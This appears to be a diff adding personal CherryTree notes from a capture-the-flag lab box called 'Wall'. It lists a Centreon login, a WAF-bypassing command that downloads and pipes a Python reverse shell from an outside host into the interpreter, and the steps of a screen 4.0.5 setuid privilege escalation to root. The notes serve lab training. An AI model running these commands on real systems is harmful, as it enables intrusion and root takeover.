@@ -1,0 +1,31 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Wall" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570618813.39" ts_lastsave="1570663489.13" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663489.13" ts_lastsave="1570663489.93" unique_id="6">
+			<rich_text>-- changing the GET verb of /monitoring to POST we get a directory /centreon with a login page and a known authenticated RCE.
+
+-- Fix the exploit or do it manually </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Creds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570618818.94" ts_lastsave="1570663312.75" unique_id="2">
+			<rich_text>centreon UI :admin:password1
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663312.75" ts_lastsave="1570663314.59" unique_id="4">
+			<rich_text>Bypassing the WAF was tough.
+-- wget${IFS}http://10.10.14.26:8090/python-rev-shell.py|python${IFS}python-rev-shell.py
+-- write a reverse shell in python and pass it using above command
+-- after getting reverse shell do basic enum</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663321.65" ts_lastsave="1570663325.97" unique_id="5">
+			<rich_text>-- After finding screen-4.0.5 version vulnerable to  priv esc and has suid set we:-
+-- create libhax.so &amp; rootshell
+-- cd /etc
+-- umask 000 # because
+-- screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+-- screen -ls # screen itself is setuid, so... 
+-- /tmp/rootshell</rich_text>
+		</node>
+	</node>
+</cherrytree>
